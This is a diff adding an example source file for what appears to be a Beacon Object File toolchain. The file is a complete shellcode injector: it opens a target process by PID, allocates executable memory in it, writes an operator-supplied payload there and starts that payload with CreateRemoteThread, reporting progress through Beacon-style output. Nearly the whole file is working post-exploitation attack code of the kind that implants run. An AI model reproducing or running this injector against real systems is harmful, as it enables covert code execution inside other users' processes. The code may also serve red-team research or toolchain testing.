@@ -1,0 +1,81 @@
+// SPDX-License-Identifier: Apache-2.0
+// bof_inject.etpy - remote-process shellcode injection.
+// Build:  entc compile example/bof_inject.etpy --type=bof
+//
+// Args:
+//   --iarg <pid>            target process
+//   --barg @<shellcode>     shellcode payload (raw bytes, length-prefixed)
+//
+// Run:    bof-runner example/bof_inject.obj \
+//             --iarg 4242 \
+//             --barg @example/payload.bin
+
+use bof;
+
+fn go(args: char*, len: int) -> void {
+
+    var parser: datap;
+    BeaconDataParse(&parser, args, len);
+    var pid: int = BeaconDataInt(&parser);
+
+    var sc_len: int = 0;
+    var sc_ptr: char* = BeaconDataExtract(&parser, &sc_len);
+
+    if pid == 0 || sc_len == 0 {
+        BeaconPrintf(0, "[!] usage: inject <pid> <shellcode>\n");
+        BeaconPrintf(0, "    operator passes the payload via bof_pack \"b\"\n");
+        ret;
+    }
+    BeaconPrintf(0, str.format("[+] target pid {d}, payload {d} bytes\n",
+                                pid, sc_len));
+
+    var h_proc: u64 = (u64)Kernel32.OpenProcess(
+        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
+        | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+        0, (u32)pid);
+    if h_proc == 0 {
+        BeaconPrintf(0, "[!] OpenProcess failed (privs / target gone?)\n");
+        ret;
+    }
+
+
+    // Allocate sc_len bytes inside the remote process, RWX.
+    var remote: u64 = (u64)Kernel32.VirtualAllocEx(
+        (void*)h_proc, (void*)0, (u64)sc_len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if remote == 0 {
+        Kernel32.CloseHandle((void*)h_proc);
+        BeaconPrintf(0, "[!] VirtualAllocEx failed\n");
+        ret;
+    }
+    BeaconPrintf(0, str.format("[+] remote alloc @ 0x{x}\n", (int)remote));
+
+    var written: u64 = 0;
+    var ok: int = Kernel32.WriteProcessMemory(
+        (void*)h_proc, (void*)remote, sc_ptr, (u64)sc_len, &written);
+    if ok == 0 {
+        Kernel32.CloseHandle((void*)h_proc);
+        BeaconPrintf(0, "[!] WriteProcessMemory failed\n");
+        ret;
+    }
+
+    var old_prot: u32 = 0;
+    Kernel32.VirtualProtectEx(
+        (void*)h_proc, (void*)remote, (u64)sc_len,
+        PAGE_EXECUTE_READ, &old_prot);
+
+    var tid: u32 = 0;
+    var h_thr: u64 = (u64)Kernel32.CreateRemoteThread(
+        (void*)h_proc, (void*)0, (u64)0,
+        (void*)remote, (void*)0, 0, &tid);
+    Kernel32.CloseHandle((void*)h_proc);
+
+    if h_thr == 0 {
+        BeaconPrintf(0, "[!] CreateRemoteThread failed\n");
+        ret;
+    }
+    Kernel32.CloseHandle((void*)h_thr);
+    BeaconPrintf(0, str.format("[+] thread {d} running in pid {d}\n",
+                                (int)tid, pid));
+    ret;
+}
